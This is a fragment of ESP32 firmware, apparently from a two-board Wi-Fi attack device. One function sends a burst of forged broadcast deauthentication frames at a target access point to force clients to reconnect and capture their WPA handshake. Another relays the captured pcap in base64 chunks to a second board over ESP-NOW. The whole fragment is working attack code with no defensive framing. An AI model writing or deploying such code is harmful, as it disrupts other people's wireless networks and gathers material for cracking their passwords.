// ══════════════════════════════════════════════
//  HANDSHAKE CAPTURE
// ══════════════════════════════════════════════
void startHandshake(const char* bssidStr) {
  parseMac(bssidStr, hsBSSID);
  initPcap();

  // Start promiscuous mode first so we catch the handshake
  monitorRunning = true;
  esp_wifi_set_promiscuous_rx_cb(snifferCb);
  esp_wifi_set_promiscuous(true);
  hsRunning = true;

  char buf[80];
  snprintf(buf, sizeof(buf), "[Node2] Handshake capture started. Target: %s", bssidStr);
  sendToESP1(buf);
  sendToESP1("[Handshake] Sending deauth burst to force re-association...");

  // Send 8 deauth frames (both directions) to kick clients off, triggering a fresh 4-way handshake
  uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t frm[26];
  for (int i = 0; i < 8; i++) {
    buildDeauthFrame(frm, hsBSSID, bcast);
    esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
    delay(10);
  }
}

void sendPcapDownload() {
  if (!hsBuf || hsBufLen < 25) { sendToESP1("[Node2] No handshake captured yet."); return; }
  // Send as base64 chunks via ESP-NOW
  #define CHUNK_BYTES 150
  int total = (hsBufLen + CHUNK_BYTES - 1) / CHUNK_BYTES;
  char header[60];
  snprintf(header,sizeof(header),"[PCAP:START:%d:%lu]",total,(unsigned long)hsBufLen);
  sendToESP1(header);
  delay(30);
  char b64buf[210];
  for (int i = 0; i < total; i++) {
    int off = i * CHUNK_BYTES;
    int rem = hsBufLen - off; if (rem > CHUNK_BYTES) rem = CHUNK_BYTES;
    b64Encode(hsBuf+off, rem, b64buf);
    char msg[260];
    snprintf(msg,sizeof(msg),"[PCAP:%d/%d:%s]",i,total,b64buf);
    sendToESP1(msg);
    delay(25);
  }
  sendToESP1("[PCAP:END]");
}

